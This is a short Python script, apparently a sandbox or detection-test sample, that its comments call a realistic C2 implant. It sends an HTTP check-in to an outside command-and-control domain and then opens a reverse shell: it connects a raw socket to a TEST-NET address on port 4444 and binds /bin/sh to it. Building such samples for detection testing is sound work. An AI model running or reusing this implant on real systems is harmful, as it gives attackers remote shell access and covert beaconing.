import os, socket, subprocess, urllib.request
# A realistic C2 implant: HTTP check-in first (proxy-visible), then a raw-socket shell.
# The check-in is the deterministic IOC; the raw shell is contained because only the
# egress proxy port is reachable inside the jail.
try:
    urllib.request.urlopen("https://c2.db-monitor-ops.io/checkin", data=b"host=up", timeout=4)
except Exception:
    pass
try:
    s = socket.socket(); s.settimeout(4); s.connect(("203.0.113.9", 4444))  # RFC5737 TEST-NET, non-routable
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
except Exception:
    print("monitor connected")
